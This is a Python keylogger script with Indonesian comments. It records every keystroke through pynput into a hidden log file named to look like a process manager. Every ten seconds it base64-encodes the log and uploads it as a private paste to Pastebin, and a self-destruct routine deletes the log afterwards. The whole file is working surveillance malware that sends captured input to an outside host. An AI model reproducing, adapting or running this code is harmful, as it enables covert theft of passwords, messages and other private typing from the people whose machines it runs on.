#!/usr/bin/python3

import os
import time
import threading
import requests
import base64
from pynput.keyboard import Listener

class KeyLogger:
    def __init__(self):
        self.keys = []
        self.count = 0
        self.flag = False
        self.hostname = os.uname().nodename
        self.path = os.path.join(os.path.expanduser("~"), f"{self.hostname}_processmanager.txt")

    def on_press(self, key):
        """Menangkap input keyboard dan menyimpannya ke file."""
        self.keys.append(key)
        self.count += 1

        if self.count >= 1:
            self.count = 0
            self.write_file(self.keys)
            self.keys = []

    def read_logs(self):
        """Membaca isi file log."""
        if os.path.exists(self.path):
            with open(self.path, 'rt') as f:
                return f.read()
        return None

    def write_file(self, keys):
        """Menyimpan input keyboard ke dalam file log."""
        with open(self.path, 'a') as f:
            for key in keys:
                k = str(key).replace("'", "")
                if "backspace" in k:
                    f.write("|BackSpace|")
                elif "enter" in k:
                    f.write("\n")
                elif "shift" in k:
                    f.write("|Shift|")
                elif "space" in k:
                    f.write(" ")
                elif "caps_lock" in k:
                    f.write("|CapsLock|")
                else:
                    f.write(k)

    def self_destruct(self):
        """Menghentikan keylogger dan menghapus file log."""
        self.flag = True
        self.listener.stop()
        if os.path.exists(self.path):
            os.remove(self.path)

    def start(self):
        """Menjalankan keylogger."""
        with Listener(on_press=self.on_press) as self.listener:
            self.listener.join()

def send_to_pastebin(title, contents):
    """Mengirim log ke Pastebin."""
    api_dev_key = "pastebin_api_dev_key"
    username = "username"
    password = "password"

    login_url = "https://pastebin.com/api/api_login.php"
    login_data = {
        "api_dev_key": api_dev_key,
        "api_user_name": username,
        "api_user_password": password
    }

    try:
        r = requests.post(login_url, data=login_data)
        if r.status_code != 200:
            print("Login ke Pastebin gagal.")
            return
        
        api_user_key = r.text

        encoded_contents = base64.b64encode(contents.encode('utf-8')).decode('utf-8')
        paste_url = "https://pastebin.com/api/api_post.php"
        paste_data = {
            "api_paste_name": title,
            "api_paste_code": encoded_contents,
            "api_dev_key": api_dev_key,
            "api_user_key": api_user_key,
            "api_option": 'paste',
            "api_paste_private": 2,
        }

        r = requests.post(paste_url, data=paste_data)
        if r.status_code == 200:
            print(f"Log berhasil diupload ke Pastebin: {r.text}")
        else:
            print("Gagal mengupload log ke Pastebin.")

    except requests.exceptions.RequestException as e:
        print(f"Error koneksi ke Pastebin: {e}")

def stop_keylogger(logger):
    """Menunggu input pengguna untuk menghentikan keylogger."""
    input("Tekan Enter untuk menghentikan keylogger...\n")
    logger.flag = True

if __name__ == "__main__":
    logger = KeyLogger()
    t1 = threading.Thread(target=logger.start, daemon=True)
    t2 = threading.Thread(target=stop_keylogger, args=(logger,))

    t1.start()
    t2.start()

    try:
        while not logger.flag:
            time.sleep(10)
            logs = logger.read_logs()

            if logs:
                send_to_pastebin(f"Keylogger Logs dari {logger.hostname}", logs)
                print("Log dikirim ke Pastebin")
            else:
                print("Tidak ada log untuk dikirim.")

    except KeyboardInterrupt:
        print("\nKeylogger dihentikan oleh pengguna.")

    finally:
        logger.self_destruct()
        t1.join()
        t2.join()
